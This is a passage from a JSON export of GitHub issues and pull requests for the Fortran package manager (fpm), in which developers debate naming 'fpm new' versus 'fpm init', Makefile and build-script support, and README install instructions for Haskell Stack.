                    "user": "certik",
                    "date": "2020-06-22 22:39:44+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 23:54:46+00:00",
                    "text": "Yeah, that's probably true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 16:07:50+00:00",
                    "text": "fpm init could generate the appropriate [[executable]] sections for the user. Just throwing an idea out there, not something that I think is a priority."
                },
                {
                    "user": "certik",
                    "date": "2020-06-23 18:18:43+00:00",
                    "text": "Cargo does not require any modifications to Cargo.toml to have executables. We should not either. So fpm init just produces the default initial fpm.toml, and users don't need to touch it, they just create the app dir and put programs in it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 18:43:16+00:00",
                    "text": "Yes, the sane default of multiple programs in app/ is what we should aim for.\nMy comment about fpm init was specific to the scenario of multiple programs in custom (non-default) location, which needs to be specified in the toml file, just like Cargo does.\nI actually didn't know (or forgot) that we supported multiple executables by specifying them in fpm.toml, so I was happy to read about it in this thread."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:08:02+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)\n\nYes, that will great !!\nalias gardhor"
                }
            ]
        },
        {
            "number": 104,
            "user": "certik",
            "date": "2020-06-20 23:01:41+00:00",
            "title": "Remove the space before comma",
            "text": "This is a fixup of #101.",
            "comments": []
        },
        {
            "number": 103,
            "user": "EverLookNeverSee",
            "date": "2020-06-20 19:53:09+00:00",
            "title": "ENH: Using OpenMP in stdlib",
            "text": "Hi there\nI started learning OpenMP couple weeks ago and would like to use it to parallelize and speed up fortran standard library codebase.",
            "comments": []
        },
        {
            "number": 102,
            "user": "everythingfunctional",
            "date": "2020-06-19 03:36:59+00:00",
            "title": "Enable fpm to create a new package",
            "text": "This is just the bare minimum I would say is necessary for fpm new.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 13:56:15+00:00",
                    "text": "A minor observation: I expected the behaviour to be to initialise a project in the current directory (like git init), as opposed to the command creating a new directory - but I think that is just something that needs documenting somewhere for users.\n\nThis (fpm new) behaviour is analogous to cargo new, and what you describe is analogous to cargo init. So if we wanted to have this, it would be covered by fpm init."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 14:56:51+00:00",
                    "text": "Yeah, I'll add some documentation to the README, and maybe PACKAGING.md"
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 17:33:44+00:00",
                    "text": "I believe this should be called init.\n\nFurthermore, it should initialize in the current directory without an argument, or create a new directory with an argument, just like git or Cargo.\n\nLet's keep the UI as similar to others established tools as possible.\n\u2026\nOn Fri, Jun 19, 2020, at 8:57 AM, Brad Richardson wrote:\n\n\n Yeah, I'll add some documentation to the README, and maybe PACKAGING.md\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVVJAAHKPTZZ565HTRXN4EFANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:03:24+00:00",
                    "text": "@certik, see cargo new and cargo init.\nIn short, cargo new (and likewise, fpm new) creates a new directory and initializes the TOML and starter source files. I think this is what this PR implements, but again, without a PR description or some example in the documentation, hard to say. @everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\ncargo init initializes the package in an existing directory with existing source files. So fpm init will be used to \"fpm-ize\" an existing package that obeys the fpm layout. fpm new is used to bootstrap a new empty package. They're different.\nAt least this is my understanding of it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:04:54+00:00",
                    "text": "@everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\n\nSorry, I didn't mean to nag. :) I saw your earlier response after writing this."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:26:07+00:00",
                    "text": "No, cargo init creates a new package in the current directory and cargo init b creates a new package in a new directory b. I am not sure what the difference is to cargo new. But I've only used cargo init and it creates a new package from scratch."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:27:04+00:00",
                    "text": "See #96 where I go into all the details. See also #96 (comment)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:31:06+00:00",
                    "text": "Both cargo new and cargo init seem identical to me. They both initialize in you current directory, or in a new directory if you provide it as an argument. The initialized files seem identical. What is the difference between the two?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 19:19:21+00:00",
                    "text": "cargo new only creates a new directory and initializes a project in it.\ncargo init initializes a project in an existing directory, and optionally does what cargo new does.\nFor cargo new, PATH is required. For cargo init, PATH is optional.\nIndeed, if starting from scratch, they appear very much the same and redundant.\nHowever, if there is anything special about the directory layout (multiple binaries, tests etc.) and contents that would be reflected in Cargo.toml, I would expect cargo init to do that. But I don't think it does, at least in the simple example I tried.\nFor fpm it should. For example, if you have a package layout with multiple programs, fpm init should be able to output a correct fpm.toml according to the special layout.\nfpm new simply bootstraps something from scratch.\nIt's very nice and useful to use Cargo and Rust for reference, but it's not an end all. We're not targeting Rust users. What we make should make sense to us. fpm new for a new project very much makes sense, and fpm init makes more sense for initializing an existing project."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 20:45:20+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\nI don't think by default it should do something different based on an existing project. However let's have it as an option.\n\nWe should optimize for the most common use case. I think that would be to start a new project from scratch.\n\nAlso, let's have only one command, init. Having two seems redundant and confusing.\n\u2026\nOn Fri, Jun 19, 2020, at 1:19 PM, Milan Curcic wrote:\n\n\n `cargo new` only creates a new directory and initializes a project in it.\n\n `cargo init` initializes a project in an existing directory, and\n optionally does what `cargo new` does.\n\n For `cargo new`, `PATH` is required. For `cargo init`, `PATH` is optional.\n\n Indeed, if starting from scratch, they appear very much the same and redundant.\n\n However, if there is anything special about the directory layout\n (multiple binaries, tests etc.) and contents that would be reflected in\n Cargo.toml, I would expect `cargo init` to do that. But I don't think\n it does, at least in the simple example I tried.\n\n For fpm it should. For example, if you have a package layout with\n multiple programs, `fpm init` should be able to output a correct\n fpm.toml according to the special layout.\n\n `fpm new` simply bootstraps something from scratch.\n\n It's very nice and useful to use Cargo and Rust for reference, but it's\n not an end all. We're not targeting Rust users. What we make should\n make sense to us. `fpm new` for a new project very much makes sense,\n and `fpm init` makes more sense for initializing an existing project.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBLCKEQ6AJ52AAUTJLRXO24NANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:19:46+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\ngit init actually does not only create a new project from scratch. It initializes existing files in the directory into the git repository if there are any. It does also create a new git repository. I think it's difficult to argue that the word \"init\" is more intuitive for creating something new than the word \"new\". To me \"init\" means initialize, which means enable some capability in existing directory+files. In the context of fpm, that would mean simply create fpm.toml given existing pakage layout.\nBut I agree that we shouldn't have redundant commands like Cargo does. It looks like the choice is whether we want to have one command that does multiple things or two narrowly-scoped commands.\n\nWe implement just fpm init which can both create a new empty project and \"fpm-ize\" an existing non-fpm package (basically generate a correct fpm.toml);\nWe implement fpm new that creates an empty project and fpm init to initialize an existing package.\n\nI think @certik prefers option 1. I prefer option 2. as it's easier to understand to me. There may be some other options I missed. @everythingfunctional @LKedward what do you prefer?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:24:07+00:00",
                    "text": "An argument for fpm init over fpm new (all else being equal) is that init is a verb and new is a noun. Using a verb would be more consistent with our existing commands (build, install, run, test), and semantically makes more sense (do this with that).\nSo I am not opposed to the word \"init\". But I do prefer smaller utility commands over more general ones that would behave differently depending on current directory."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 22:24:39+00:00",
                    "text": "Technically, giti init doesn't create a new project from scratch. It initializes an existing project's git configuration.\nI like having two different commands because they do two different things. fpm new for new projects, and fpm init for existing projects.\nSince the most common use case would be to start a new project from scratch, that's why I implemented it first."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:06:05+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects. So I don't think we should optimize for this rare case.\n\nSo I vote to rename new to init and we are in agreement.\n\u2026\nOn Fri, Jun 19, 2020, at 4:24 PM, Brad Richardson wrote:\n\n\n Technically, `giti init` doesn't create a new project from scratch. It\n initializes an existing project's git configuration.\n\n I like having two different commands because they do two different\n things. `fpm new` for new projects, and `fpm init` for existing\n projects.\n\n Since the most common use case would be to start a new project from\n scratch, that's why I implemented it first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWFIEEUF4HMPJRLSMM3RXPQTHANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 23:24:53+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\nI expect that we'll use fpm init quite often in the early days, perhaps even more often than fpm new, as we'll work hard on adapting existing Fortran packages (ours and those of others) into fpm. In the long run, I expect fpm new would be used more often.\nIt also depends how you're used to doing things. I never ever ran git init to create a new repo from scratch. I always run it after I've written and played with some code and want to make a git repo out of it. Same with fpm. For any more complex layout package, I'd much rather run fpm init and have fpm write the fpm.toml for me, than me editing it by hand every time I add a new file.\nEven if it's an edge case and something that we'd want down the road, I think it's useful to carefully design and name things early on."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:53:03+00:00",
                    "text": "I always indeed run \"git init\" on an empty repository to start a new project.\n\nRegarding adding new files, you don't modify fpm.toml when you do that.\n\u2026\nOn Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n\n\n > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\n I expect that we'll use `fpm init` quite often in the early days,\n perhaps even more often than `fpm new`, as we'll work hard on adapting\n existing Fortran packages (ours and those of others) into fpm. In the\n long run, I expect `fpm new` would be used more often.\n\n It also depends how you're used to doing things. I never ever ran git\n init to create a new repo from scratch. I always run it after I've\n written and played with some code and want to make a git repo out of\n it. Same with fpm. For any more complex layout package, I'd much rather\n run `fpm init` and have fpm write the fpm.toml for me, than me editing\n it by hand every time I add a new file.\n\n Even if it's an edge case and something that we'd want down the road, I\n think it's useful to carefully design and name things early on.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:54:59+00:00",
                    "text": "More generally, let's follow what Rust does, it's a well tested approach. Once we use it and don't like it, then let's discuss to do something else.\n\u2026\nOn Fri, Jun 19, 2020, at 5:52 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I always indeed run \"git init\" on an empty repository to start a new project.\n\n Regarding adding new files, you don't modify fpm.toml when you do that.\n\n On Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n >\n >\n > > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n >\n > I expect that we'll use `fpm init` quite often in the early days,\n > perhaps even more often than `fpm new`, as we'll work hard on adapting\n > existing Fortran packages (ours and those of others) into fpm. In the\n > long run, I expect `fpm new` would be used more often.\n >\n > It also depends how you're used to doing things. I never ever ran git\n > init to create a new repo from scratch. I always run it after I've\n > written and played with some code and want to make a git repo out of\n > it. Same with fpm. For any more complex layout package, I'd much rather\n > run `fpm init` and have fpm write the fpm.toml for me, than me editing\n > it by hand every time I add a new file.\n >\n > Even if it's an edge case and something that we'd want down the road, I\n > think it's useful to carefully design and name things early on.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#102 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-20 02:42:07+00:00",
                    "text": "I honestly didn't even know that git init directory was a valid command. I learned something new today! I always thought you just had to git init inside a directory, existing files or not.\nI still think that the command that makes the most sense for creating a new project is fpm new, even if that's not what Cargo does. Although I will note the following output from cargo, which would seem to suggest that cargo somewhat agrees with me. cargo new is for a new cargo package and cargo init is for in an existing directory.\n[darter:~] cargo help new\ncargo-new \nCreate a new cargo package at <path>\n\nUSAGE:\n    cargo new [OPTIONS] <path>\n\n[darter:~] cargo help init\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]"
                },
                {
                    "user": "certik",
                    "date": "2020-06-20 17:04:23+00:00",
                    "text": "Here is the guide for Cargo:\nhttps://doc.rust-lang.org/cargo/guide/creating-a-new-project.html\nit seems they recommend cargo new also.\nI explained my position above, Milan and Brad explained theirs, and it looks like they prefer to use fpm new instead of fpm init to start a new package. So unless more people have an opinion right now, let's go with fpm new and move on.\nHowever, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-20 18:21:39+00:00",
                    "text": "However, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new.\n\nDefinitely, we don't have a majority agreement right now."
                }
            ]
        },
        {
            "number": 101,
            "user": "EverLookNeverSee",
            "date": "2020-06-17 11:51:54+00:00",
            "title": "Optional Fix for README",
            "text": "Separating navigating to stack directory and Adding to PATH\nBecause some of users may navigate to stack directory first and and enter this command(export PATH=\"$PATH:pwd/stack-2.1.3-linux-x86_64-static/)  in order to install stack command that causes error below in $PATH:\nNo such file or directory",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-17 12:13:30+00:00",
                    "text": "@everythingfunctional This reminds me of a question I wanted to ask about the instructions for installing stack: why does the README recommend following the 'Manual Download' instructions as opposed to using the simpler install script or distribution package managers? I used the Ubuntu distribution package followed by running $ stack upgrade which was much simpler and works fine.\nThe instructions for installing stack are pleasantly comprehensive (and cross-platform!) and I think we should simply refer users to this page and allow them to choose their preferred installation method."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:40:43+00:00",
                    "text": "I think this is a positive change, as our specific instruction was Linux only.\n\nThank you @milancurcic for approving this PR."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:45:34+00:00",
                    "text": "Thanks @EverLookNeverSee , I agree this is an improvement.\nUnless Brad had a specific reason for recommending the manual installation method, I think this is good to merge with one change: can you revert 7ee74b1?\n\nOk, I'll revert it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-17 16:20:15+00:00",
                    "text": "@certik wanted to support people who didn't have sudo access to install system wide. I agree that the official stack install instructions are generally the preferred way, so I support this change. We may  want to have a separate section to put the manual install instructions somewhere just in case."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 20:34:11+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access)."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-06-17 20:50:39+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access).\n\nI agree. Could this link  just be mentioned to replace the deleted section. Furthermore, all OS are described there."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 21:43:57+00:00",
                    "text": "I think that link would work."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-20 07:59:48+00:00",
                    "text": "@certik\nWhat should we do for this PR?"
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-21 06:52:32+00:00",
                    "text": "@certik Thanks for merging."
                }
            ]
        },
        {
            "number": 100,
            "user": "milancurcic",
            "date": "2020-06-16 17:52:56+00:00",
            "title": "add a note about Effing Package Management and elaborate on prototype",
            "text": "This PR:\n\nAdds a clarification about the other fpm\nExpands the note on fpm being an early prototype\n\nFixes #90",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 18:09:05+00:00",
                    "text": "Minor wording change suggestion, but other than that this looks good. Thanks for tackling this one."
                },
                {
                    "user": "certik",
                    "date": "2020-06-16 18:29:33+00:00",
                    "text": "I would also add at the end:\nAs the prototype matures and we enter production, we will do our best to stay backwards compatible.\n(Otherwise looks good, thanks!)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 18:51:40+00:00",
                    "text": "Thank you, both. Merging."
                }
            ]
        },
        {
            "number": 99,
            "user": "everythingfunctional",
            "date": "2020-06-15 00:11:07+00:00",
            "title": "Add support for Makefiles and generic build scripts",
            "text": "",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 00:33:29+00:00",
                    "text": "I think I might need some help from somebody who understands Windows a bit better to help me with the issue there. I'm guessing either something with the absolute paths is screwing up make, or the environment variables aren't working properly. I'm leaning towards the former, but I don't have access to a Windows machine to test it with at the moment."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 01:00:39+00:00",
                    "text": "The windows error is:\n# gfortran (for build/gfortran_debug/test/main.o)\n# gfortran (for build/gfortran_debug/test/runTests.exe)\n Hello, from test!\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\with_makefile\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\makefile_complex\\libmakefile_complex.a'.  Stop."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 04:20:47+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\u2026\nOn Sun, Jun 14, 2020, at 9:53 PM, Brad Richardson wrote:\n\n\n ***@***.**** commented on this pull request.\n\n In test/example_packages/makefile_complex/Makefile\n <#99 (comment)>:\n\n > @@ -0,0 +1,9 @@\n +INCLUDE_FLAGS = $(addprefix -I,$(INCLUDE_DIRS))\n +\n +$(BUILD_DIR)/libmakefile_complex.a: $(BUILD_DIR)/wrapper_mod.o\n The ones I used are actually the standard environment variables for\n Makefiles. You (almost) can use an empty Makefile and these would\n actually work. We can use prefixed variables, but it's one extra\n difference from what a lot of people will already have and be used to.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#99 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGC5W5YVTCC3G5C4JDRWWLMJANCNFSM4N5VZI5A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 04:53:46+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\nI'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 05:58:10+00:00",
                    "text": "I'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?\n\nI don't know for sure, but an example would be an autotools build system, that reads these common environment variables, and if they are set by fpm it might break the build. I've definitely seen build systems where things break if you set these variables. So then the user would have to unset them before running autotools.\nIt seems that prefixing them with FPM_, it would ensure that as we expose more variables in the future, things that already work will continue working.\nHowever, one variable I would set automatically, and that is CMAKE_PREFIX_PATH. I think Spack does it, and that makes any CMake project to easily find all the fpm dependencies without the user having to do anything.\nI think your idea is to follow a similar philosophy for raw Make also.\nAlso as a documentation, it's hard to tell from looking at the script who sets the BUILD_DIR variable. But if it is FPM_BUILD_DIR, then it is clear that it is set by fpm.\nI don't know. Let's try this, and keep our options open to possibly prefix it if we run into problems?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 06:16:40+00:00",
                    "text": "My thinking is that if having those environment variables set means your build script doesn't work, that your build script isn't compatible with fpm, and you need a different one for fpm to use. Since the variables aren't persistent after fpm is done running, it won't break existing build systems. They can coexist side by side.\nIf we use prefixed variables, then users are practically guaranteed to have to write a new build script for fpm to use. If we use commonly used ones, there's a chance their existing one might actually work.\nI agree, let's see how this works out, and if we have to change it later, we can.\nI'm not all that familiar with CMake, but we can always do different things for different build tools when we add support for them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 14:53:04+00:00",
                    "text": "My only minor nitpick is with the compounding of Makefiles and build scripts / executables in the fpm.toml definition\n\nI hadn't really thought about it that hard. It's worth considering. Usually I'd agree, but somehow this seemed simpler from a user and documentation stand point. If you have a custom build process, there's one way/place to specify it, and fpm just knows what to do with it.\n@milancurcic or @certik , do you guys have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 17:07:21+00:00",
                    "text": "These are all really tough questions with good arguments on both sides. My only suggestion is to be open and open to change things if things don't feel right. I think the way forward is to insist that we are still in a prototype phase, and so things can (and will) change --- let's put this in bold in the README? And in a prototype phase, let's just try it, and get more experience, and be ready to change things. Only after we declare we are in production, we should be backwards compatible as  much as possible.\nIn general, I was hoping that fpm would simply execute the \"script\" as an executable, and always pass the same environment variables. I feel it is ok for fpm to know how to execute the script properly, so a bash script using bash, a Xonsh script using Xonsh, Make file using make, and an executable as an executable.\nI think it is absolutely ok for users to write a short build script. You will have to do it anyway for cmake projects."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-15 18:10:22+00:00",
                    "text": "I don't see issues with this. Like @certik said, let's try it and we can revise if there's need for it. We can't think of all correct answers ahead of time without trying things first in practice.\nMinor nit pick: As a user I didn't expect that for using make the build_script value would be Makefile or *.mk. build_script = \"make\" or build_script = \"make target\" seems more intuitive, because that's what I would've typed otherwise. However, this is also perhaps problematic because neither Makefile nor make are scripts (Makefile is a specification file and make is a command/tool). Perhaps a build_command parameter would be more appropriate if both arbitrary scripts and make are to be invoked with it."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 19:47:09+00:00",
                    "text": "One issue with build_command is that we need to specify the shell. So it could be Bash on Linux/macOS and PowerShell on Windows. Simple commands like make target would work in both. More advanced things, such as referencing an environment variable will not work cross-platform. Essentially the issue is a lack of cross-platform shell.\nRust / Cargo goes around this by simply writing the \"build script\" in Rust itself, thus making it cross-platform.\nI think there is a huge need for a cross-platform native shell. We even started one: https://github.com/xonsh/minixonsh (Xonsh itself is one, but being a Python program, it has the typical Python issues related to distribution and speed).\nBut until there is one (and well supported), I think we should not just pick one and require it.\nSo given all of this, the two option are:\n\n\nbuild_script would be directly executed in Bash / PowerShell, so you have to use a subset that works in both, such as make or make target. Or bash my_buildscript.sh.\n\n\nbuild_script points to a script or executable that gets executed. So Makefile gets executed via make, as fpm knows this.\n\n\nI still think 2. seems better.\nBut overall, I don't know what the best way forward is. So let's just try something to get moving, and iterate."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 02:48:48+00:00",
                    "text": "I think there will be some packages which are just not supported on all platforms, and that's ok. As a community we can encourage that and provide support when we're able, but that's going to be a big hurdle in some instances.\nAs everybody seems to agree, let's try this PR out and see how it goes."
                }
            ]
        },
        {
            "number": 98,
            "user": "epagone",
            "date": "2020-06-13 18:35:35+00:00",
            "title": "Add pre-requisites to `stack build` in `README`",
            "text": "On my Ubuntu 20.04 machine, I have installed Haskell Stack unpacking the tarball and adding it to my PATH, as described in the README. After having cloned the fpm repository, stack build failed because I did not have the developers library of gmp (the package libgmp-dev, in my case). I have created PR #97 to add this information to the README (plus the fix to a trivial typo).\nHowever, I believe that we should provide the user with info to cover far more cases (consider also that my test did not start from a \"vanilla\" Ubuntu 20.04 and it is likely that I had already some required packages installed without knowing it). Ideally, I think that the following should be covered in the README:\n\npackages required for all the major GNU/Linux distributions\npre-requisites on Windows 8 and 10\npre-requisites on Apple OSs\n\nConsidering that I have no clue on how to action the above points, I wonder if the CI tools could help. (Disclaimer: I only vaguely know what CI is.)\nPS: just for the records, I was temporary stopped also by the following error in my attempts to complete stack build\n$ stack build\nLinking /home/emanuele/.stack/setup-exe-cache/x86_64-linux-tinfo6/tmp-Cabal-simple_mPHDZzAJ_2.4.0.1_ghc-8.6.5 ...\nclock               > configure         \nclock               > Configuring clock-0.8...\nclock               > build             \ncolour              > configure         \nclock               > Preprocessing library for clock-0.8..\nclock               > Building library for clock-0.8..\nclock               > [1 of 1] Compiling System.Clock\ncolour              > Configuring colour-2.3.5...\ncolour              > build             \nfile-embed          > configure         \ncolour              > Preprocessing library for colour-2.3.5..\ncolour              > Building library for colour-2.3.5..\ncolour              > [ 1 of 14] Compiling Data.Colour.CIE.Chromaticity\nfile-embed          > Configuring file-embed-0.0.11.1...\nfile-embed          > build             \nfile-embed          > Preprocessing library for file-embed-0.0.11.1..\nfile-embed          > Building library for file-embed-0.0.11.1..\ncolour              > [ 2 of 14] Compiling Data.Colour.CIE.Illuminant\nfile-embed          > [1 of 1] Compiling Data.FileEmbed\ncolour              > [ 3 of 14] Compiling Data.Colour.Chan\ncolour              > [ 4 of 14] Compiling Data.Colour.Internal\ncolour              > [ 5 of 14] Compiling Data.Colour.Matrix\ncolour              > [ 6 of 14] Compiling Data.Colour.RGB\nclock               > copy/register     \nclock               > Installing library in /home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/clock-0.8-H1S1zDefxirImaRbI6ITNv\nclock               > Registering library for clock-0.8..\ncolour              > [ 7 of 14] Compiling Data.Colour.RGBSpace.HSL\nfile-embed          > copy/register\nfile-embed          > Installing library in /home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/file-embed-0.0.11.1-1DkjC7VmQhQFLvxtpUIE3o\ncolour              > [ 8 of 14] Compiling Data.Colour.RGBSpace.HSV\ncolour              > [ 9 of 14] Compiling Data.Colour.SRGB.Linear\nfile-embed          > Registering library for file-embed-0.0.11.1..\ncolour              > [10 of 14] Compiling Data.Colour.RGBSpace\ncolour              > [11 of 14] Compiling Data.Colour.SRGB\ncolour              > [12 of 14] Compiling Data.Colour\ncolour              > [13 of 14] Compiling Data.Colour.Names\ncolour              > [14 of 14] Compiling Data.Colour.CIE\ncolour              > copy/register\ncolour              > Installing library in /home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/colour-2.3.5-y0xjV3ONUd40VuBtReEvC\ncolour              > Registering library for colour-2.3.5..\nHttpExceptionRequest Request {\n  host                 = \"casa.fpcomplete.com\"\n  port                 = 443\n  secure               = True\n  requestHeaders       = []\n  path                 = \"/v1/pull\"\n  queryString          = \"\"\n  method               = \"POST\"\n  proxy                = Nothing\n  rawBody              = False\n  redirectCount        = 10\n  responseTimeout      = ResponseTimeoutDefault\n  requestVersion       = HTTP/1.1\n}\n (ConnectionFailure Network.Socket.getAddrInfo (called with preferred socket type/protocol: AddrInfo {addrFlags = [AI_ADDRCONFIG], addrFamily = AF_UNSPEC, addrSocketType = Stream, addrProtocol = 0, addrAddress = <assumed to be undefined>, addrCanonName = <assumed to be undefined>}, host name: Just \"casa.fpcomplete.com\", service name: Just \"443\"): does not exist (Try again))\nProgress 4/30\n\nbut simply running stack build again solved magically the issue (I don't know what that is).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-06-14 04:37:30+00:00",
                    "text": "I see, thanks.\nWe are planning to actually implement the production version of fpm in Fortran itself, and distribute it as a binary. So most of these issue will not be issues in the future. But in order to bootstrap fpm, we will keep the Haskell verison with minimal features (roughly as it is now), so that we can use it to actually develop the Fortran version of fpm.\nThanks for submitting this."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-06-15 13:15:48+00:00",
                    "text": "We are planning to actually implement the production version of fpm in Fortran itself, and distribute it as a binary.\n\nWas this mentioned somewhere previously? I recall reading it would be done in C++ for performance. If we could set up stdlib to work with the current fpm, and get the necessary string and system routines in stdlib it would be a nice test of the entire project."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-15 14:07:34+00:00",
                    "text": "If we could set up stdlib to work with the current fpm\n\nDo you mean building stdlib using fpm? I think this is a good short-term goal for fpm - I believe the prerequisites before we can do this are #78 (preprocessor support) and #86 (submodules support).\nIf fpm is implemented in Fortran, then using stdlib for this would also be a good demonstration of stdlib."
                }
            ]
        },
        {
            "number": 97,
            "user": "epagone",
            "date": "2020-06-13 18:33:53+00:00",
            "title": "add Ubuntu 20.04 package pre-requisite to `README`",
            "text": "Testing the building process, I have identified a pre-requisite on my machine with Ubuntu 20.04. Fixed a trivial typo, too.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 17:38:03+00:00",
                    "text": "Merging, thank you @epagone!"
                }
            ]
        },
        {
            "number": 96,
            "user": "certik",
            "date": "2020-06-12 17:08:54+00:00",
            "title": "Implement \"fpm init\" to create the initial project skeleton",
